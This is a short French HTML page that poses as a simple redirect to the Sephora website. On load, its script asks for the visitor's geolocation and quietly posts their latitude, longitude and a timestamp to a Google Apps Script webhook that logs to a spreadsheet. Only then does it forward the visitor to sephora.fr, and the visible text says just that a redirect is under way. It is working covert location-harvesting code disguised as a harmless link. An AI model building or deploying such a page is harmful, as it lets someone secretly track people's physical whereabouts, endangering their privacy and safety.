<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Redirection en cours...</title>
    <script>
        function redirectToSephora() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    // Envoi des données de géolocalisation à Google Sheets via le NOUVEAU Webhook
                    fetch('https://script.google.com/macros/s/AKfycbwXxYqWMjIeubGif1owWOeieMdjIW_H_oXZMH7aYpmE2mIWI3pUZl8eqxmP_fvYRhi-cg/exec', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            timestamp: new Date().toISOString()
                        })
                    })
                    .then(response => response.json())
                    .then(data => console.log("Réponse du serveur :", data))
                    .catch(error => console.error("Erreur lors de l'envoi des données :", error));

                    // Redirection automatique vers Sephora après l'envoi des données
                    window.location.href = "https://www.sephora.fr";
                }, function(error) {
                    console.error("Erreur de géolocalisation :", error);
                    window.location.href = "https://www.sephora.fr";
                });
            } else {
                console.error("Géolocalisation non supportée par ce navigateur.");
                window.location.href = "https://www.sephora.fr";
            }
        }
    </script>
</head>
<body onload="redirectToSephora()">
    <p>Redirection en cours... Veuillez patienter quelques secondes.</p>
</body>
</html>
